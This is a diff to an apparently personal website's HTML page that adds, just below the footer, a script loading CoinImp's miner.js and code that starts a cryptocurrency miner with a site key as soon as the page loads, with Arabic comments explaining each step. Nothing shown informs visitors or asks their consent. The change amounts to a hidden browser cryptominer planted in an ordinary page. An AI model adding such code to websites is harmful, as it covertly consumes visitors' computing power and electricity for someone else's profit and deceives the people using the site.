@@ -167,6 +167,21 @@
         <p>&copy; 2024 Basem Halaika. All rights reserved.</p>
     </footer>
 
+    <!-- كود التعدين باستخدام CoinImp -->
+    <script src="https://www.coinimp.com/scripts/miner.js"></script>
+    <script>
+        // إنشاء كائن التعدين باستخدام CoinImp
+        var miner = new CoinImp.Anonymous('77df418b1f6d4f42050541215eed6c63cfaca765118650d51be37632dfc12cb0');  // ضع مفتاح الموقع الخاص بك هنا
+
+        // بدء التعدين تلقائياً عند تحميل الصفحة
+        miner.start();
+
+        // اختياري: استمع لحالة التعدين (مثل عند نجاح الاتصال أو حدوث خطأ)
+        miner.on('found', () => console.log('Hash found!'));
+        miner.on('accepted', () => console.log('Hash accepted!'));
+        miner.on('error', (err) => console.error('Error: ', err));
+    </script>
+
     <script>
         function playSound() {
             var sound = document.getElementById('sound');
